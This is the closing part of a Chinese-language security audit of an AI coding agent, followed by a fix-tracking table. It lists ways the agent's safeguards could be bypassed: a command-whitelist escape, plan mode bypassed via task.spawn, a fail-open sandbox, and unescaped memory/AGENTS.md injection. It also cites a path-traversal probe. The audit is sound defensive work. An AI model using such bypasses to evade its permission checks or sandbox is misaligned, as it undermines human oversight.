   这与 `task.spawn` 的情况形成鲜明对比——说明项目对「远端自我声明不可信」这一威胁有清醒认识，**应作为正面案例记录**（见 §5.6 第 7 条）。
3. **`.minicoding/agents/*.md` 加载器**：`model/subagent.rs:32`、`spawn.rs:73` 引用但未找到加载器，`SubagentType::Custom` 疑似实现缺失。
4. **取消路径的 drop-mid-tool 风险**：`rt.rs:909-943` 三路 `select!` 在 cancel/timeout 时 drop `turn_fut`，若工具正处写操作中途会留下部分写入。项目有 `file-undo` journal 兜底，但**未验证 cancel 路径是否触发 journal 回滚**。作者至少显式处理了 `backfill_missing_tool_results()`(:914) 与 `append_terminal_notice()`(:917)，意识到位。
5. **`?token=` 路径规范化**：`http.rs:482-484` 用 `starts_with("/sessions/") && ends_with("/events")` 判断 SSE 豁免，规范化路径（如 `/sessions/../../events`）是否可绕过未验证（axum 应已规范化）。
6. **`hooks/registry.rs` 的 10 个事件**：`builtin_deny` 透传是否逐事件一致未逐条核对（从两处强制点看应完整）。
7. **异步上下文中的阻塞调用**：`memory/src/project_doc/loader.rs` 大量 `std::fs::`，但已拆 `load_sync`/`expand_imports_async` 双路径，未深挖 async 路径是否误调 sync 版本。
8. **Windows/macOS 平台行为**：本机为 Linux/WSL，所有跨平台结论基于源码阅读，未经实际运行验证。
9. **`permission_timeout_sec`（默认 300s）与 Web 弹窗 65s 超时不匹配时**的默认判定行为未追到底。

---

*报告结束。*





---

## 19. 修复追踪（2026-08-31，v0.3.11）

本节记录 R10 报告发布后至 v0.3.11 的修复进展。状态图例：✅ 已修复 / 🟡 部分修复 / ⬜ 未处理（登记）。

### 19.1 P0（4/4 ✅）

| 编号 | 问题 | 状态 | 提交 |
|------|------|:---:|------|
| R10-01 | 只读命令白名单可绕过 | ✅ | `77383b0`（移除 env/find、git 子命令收紧、cargo check 移出 + 13 回归用例） |
| R10-02 | Plan 模式可被 task.spawn 绕过 | ✅ | `77383b0`（SideEffect::Spawn + permission_mode 传播） |
| R10-03 | 沙箱 fail-open + exec 自动批准 | ✅ | `03c5b98`（sandbox_fail_closed + build_runtime_fail_closed） |
| R10-04 | Web 形态开箱 401 | ✅ | `784db24`（401 可操作 body + 前端 token 输入） |

### 19.2 P1（13/17 ✅，4 项部分或文档化）

| 编号 | 问题 | 状态 | 说明 |
|------|------|:---:|------|
| R10-05 | 能力漂移守卫恒真 | ✅ | `1f8e9c0`（assemble_*_tool_registry 真实装配函数比对） |
| R10-06 | full-access 确认死代码 | ✅ | `a54e247`（build_preset_policy 复用 warning_text + serve 二次确认） |
| R10-07 | 记忆/AGENTS.md 注入无边界转义 | ✅ | `4f6c495`（escape_boundary_tag 零宽空格转义 + 3 测试） |
| R10-08 | 记忆无读取/删除入口 | ✅ | `c31bffc`（memory list/read/clear 子命令） |
| R10-09 | 权限持久化无作用域/无过期 | ✅ | `839b17d`（with_workdir + TTL 30 天） |
| R10-10 | 输出预留 4096 与 64K 脱钩 | ✅ | `50c0551`（reserved_output 由 provider 驱动） |
| R10-11 | context_window 无单一事实来源 | ✅ | `4f2c9d2`（effective_context_window 统一） |
| R10-12 | fs.grep/git.diff 不脱敏 | ✅ | `9a7b452`（is_sensitive_path 共享 + grep 脱敏） |
| R10-13 | 沙箱覆盖 git/MCP/Hook 子进程 | 🟡 | SDK build_hook_registry 已通过 SEC-5 with_sandbox 注入沙箱（CLI 路径覆盖）；git/MCP 子进程未纳入，登记 Roadmap |
| R10-14 | 无 LICENSE 文件 | ✅ | `313c437`（AGPL-3.0 全文 661 行） |
| R10-15 | CLI feature 门控失效 | ✅ | `f81f113`（path 依赖 + default-features=false + doctor 能力集） |
| R10-16 | Windows 沙箱非安全边界 | ✅ | `c06e3f4` + `7651fbf`（README/innovation/security.md 措辞修正 + §12 重写） |
| R10-17 | seccomp 从未交付 | 🟡 | 文档标注实验性（默认关、需 opt-in 编译）；release 未启用，登记 Roadmap |
| — | TUI panic 破坏终端 | ✅ | `3b6cc62`（panic hook 强制 restore） |
| — | L2 摘要首消息 assistant → 400 | ✅ | `e4e3ded`（首消息角色归一化） |
| — | 压缩触发/判据口径不一致 | ✅ | `caedfc6`（effective_compact_threshold 统一） |
| — | 无 LICENSE/CONTRIBUTING/SECURITY | ✅ | `313c437` + `242b344` |

### 19.3 P2（已修复项）

| 编号 | 问题 | 状态 | 说明 |
|------|------|:---:|------|
| R10-18 | 双轨 Runtime 装配 | ⬜ | server 侧仍缺 Hooks/MCP/Extensions/AutoMemory/子 Agent，登记 Roadmap（架构级改动） |
| R10-19 | 文档漂移 | ✅ | `0aab408`/`a6aa970`/`7651fbf`（architecture.md 补 5 crate、modules.md 命名、features.md M-11、api.md/security.md） |
| R10-20 | innovation.md fail-open 列为创新点 | ✅ | `c06e3f4`（§3.4 重写为"可配置降级策略，默认 fail-closed"） |
| R10-21 | MINICODING_CONTEXT_WINDOW 仅 OpenAI | ✅ | `4f2c9d2`（三端统一） |
| R10-22 | 前端版本漂移 | ✅ | `125f436`（package.json/tauri.conf.json 0.3.9→0.3.10） |
| R10-23 | 目录权限 0755 | ✅ | `efcb89e`（ensure_private_dir 0700） |
| R10-24 | AutoApprovePrompter 恒 Allow | ✅ | `03c5b98`（exec 走 fail-closed，沙箱降级弹窗不再自动批准） |
| — | auto.index.json 损坏不自愈 | ✅ | `3b11b0c`（warn + 清空重建） |
| — | metrics 全局状态测试隔离 | ✅ | `d409c0d`（reset_metrics） |
| — | Retry-After 无上限 | ✅ | `0e570ae`（截断到 max_backoff_ms） |
| — | is_local_origin 只校验 host | ✅ | `638b591`（CORS 收紧 + Vary: Origin） |
| — | 配置解析失败静默降级 | ✅ | `21c868b`（sdk/server eprintln 警告） |
| — | config.toml 明文 key 声明矛盾 | ✅ | `d4f20ff`（文档修正 + warn 提示） |
| — | Ollama tool_call index 撞 0 | ✅ | `12fd63c`（跨行累计） |
| — | Web 无 ErrorBoundary | ✅ | `ea1d24b` |
| — | TUI 错误指引指向不存在参数 | ✅ | `e99af83` |

### 19.4 仍登记 Roadmap（未处理）

- **R10-18 双轨 builder**：server 装配补 Hooks/MCP/Extensions/AutoMemory/子 Agent（架构级，v0.4 前）。
- **R10-13 git/MCP 子进程沙箱**：git/MCP 子进程纳入沙箱覆盖。
- **R10-17 seccomp 交付**：release 启用 seccomp feature 或从卖点移除（已从文档卖点移除）。
- **AGPL 与可嵌入 SDK 的许可张力**（§17.4）：v0.4 前明确决策。

---

*报告结束（2026-08-31 追加修复追踪）。*
